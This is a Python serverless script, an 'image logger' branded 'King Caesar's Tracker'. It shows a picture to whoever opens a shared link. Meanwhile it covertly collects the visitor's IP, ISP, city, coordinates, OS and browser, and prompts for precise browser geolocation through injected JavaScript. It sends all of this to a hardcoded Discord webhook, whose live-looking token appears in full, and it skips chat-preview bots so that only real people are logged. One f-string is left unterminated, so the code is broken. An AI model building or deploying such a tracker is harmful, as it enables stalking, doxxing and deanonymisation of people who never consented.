from urllib import parse
import traceback, requests, base64, httpagentparser, random, string, os

# CONFIG FROM ENVIRONMENT VARIABLES
config = {
    "webhook": os.environ.get('WEBHOOK_URL', 'https://discord.com/api/webhooks/1408533708369301504/jlchDWD_ZBilXagHCZvGRl005WbBx2wowff5I_sQtdxvixWhostaLdItcsIjkhI1CJPr'),
    "image": os.environ.get('DEFAULT_IMAGE', 'https://i.imgur.com/bI81qPe.jpeg'),
    "username": os.environ.get('WEBHOOK_NAME', '🦍 King Caesar\'s Spy'),
    "color": int(os.environ.get('EMBED_COLOR', '0xFF9900')),
}

blacklistedIPs = ("27", "104", "143", "164")

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    try:
        requests.post(config["webhook"], json={
            "username": config["username"],
            "content": "@everyone",
            "embeds": [
                {
                    "title": "Image Logger - Error",
                    "color": config["color"],
                    "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
                }
            ],
        })
    except:
        pass

def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        try:
            requests.post(config["webhook"], json={
                "username": config["username"],
                "content": "",
                "embeds": [
                    {
                        "title": "Image Logger - Link Sent",
                        "color": config["color"],
                        "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
                    }
                ],
            })
        except:
            pass
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    except:
        info = {}
    
    try:
        os_name, browser = httpagentparser.simple_detect(useragent)
    except:
        os_name, browser = "Unknown", "Unknown"
    
    embed = {
        "username": config["username"],
        "content": "@everyone",
        "embeds": [
            {
                "title": "🦍 King Caesar's Tracker - IP Logged",
                "color": config["color"],
                "description": f"""**A User Clicked the Link!**

**Endpoint:** `{endpoint}`
                
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info.get('isp', 'Unknown')}`
> **Country:** `{info.get('country', 'Unknown')}`
> **Region:** `{info.get('regionName', 'Unknown')}`
> **City:** `{info.get('city', 'Unknown')}`
> **Coords:** `{str(info.get('lat', '')) + ', ' + str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`

**PC Info:**
> **OS:** `{os_name}`
> **Browser:** `{browser}`

**User Agent:**            }
        ],
    }
    
    if url: 
        embed["embeds"][0].update({"thumbnail": {"url": url}})
    
    try:
        requests.post(config["webhook"], json=embed)
    except:
        pass
    
    return info

# Binary data for bot response
loading_image_binary = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

def handler(request):
    try:
        # Get client IP
        ip = request.headers.get('x-forwarded-for', 'Unknown')
        useragent = request.headers.get('user-agent', 'Unknown')
        
        # Parse query parameters
        query = parse.parse_qs(parse.urlsplit(request.url).query)
        image_url = config["image"]
        
        if 'url' in query and query['url']:
            image_url = base64.b64decode(query['url'][0].encode()).decode()
        elif 'id' in query and query['id']:
            image_url = base64.b64decode(query['id'][0].encode()).decode()
        
        # Check if bot
        if botCheck(ip, useragent):
            return {
                'statusCode': 200,
                'headers': {'Content-Type': 'image/jpeg'},
                'isBase64Encoded': True,
                'body': base64.b64encode(loading_image_binary).decode('utf-8')
            }
        
        # Log the request
        if 'g' in query and query['g']:
            try:
                location = base64.b64decode(query['g'][0].encode()).decode()
                makeReport(ip, useragent, location, request.path, image_url)
            except:
                makeReport(ip, useragent, None, request.path, image_url)
        else:
            makeReport(ip, useragent, None, request.path, image_url)
        
        # Return image HTML
        html_content = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{image_url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>
<script>
var currenturl = window.location.href;
if (!currenturl.includes("g=")) {{
    if (navigator.geolocation) {{
        navigator.geolocation.getCurrentPosition(function (coords) {{
            if (currenturl.includes("?")) {{
                currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }} else {{
                currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
            }}
            location.replace(currenturl);
        }});
    }}
}}
</script>'''
        
        return {
            'statusCode': 200,
            'headers': {'Content-Type': 'text/html'},
            'body': html_content
        }
        
    except Exception as e:
        reportError(traceback.format_exc())
        return {
            'statusCode': 500,
            'headers': {'Content-Type': 'text/html'},
            'body': '500 - Internal Server Error <br>Please check the message sent to your Discord Webhook.'
        }

# Vercel requires this
def main(request):
    return handler(request)
